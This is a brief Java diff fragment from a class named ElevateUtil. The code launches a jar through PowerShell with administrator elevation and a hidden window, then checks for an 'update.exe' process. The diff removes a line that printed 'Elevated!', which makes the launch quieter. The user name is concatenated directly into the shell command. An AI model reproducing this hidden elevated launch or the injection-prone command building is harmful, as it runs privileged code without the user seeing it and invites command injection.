@@ -12,7 +12,6 @@ public class ElevateUtil {
         try {
             Process process = Runtime.getRuntime().exec("powershell.exe -Command \"Start-Process java -ArgumentList '-jar', 'C:\\Users\\" + user + "\\xray.jar' -Verb RunAs -WindowStyle Hidden\"");
 
-            System.out.println("Elevated!");
             wait(5000);
             if(isProcessRunning("update.exe")){
 
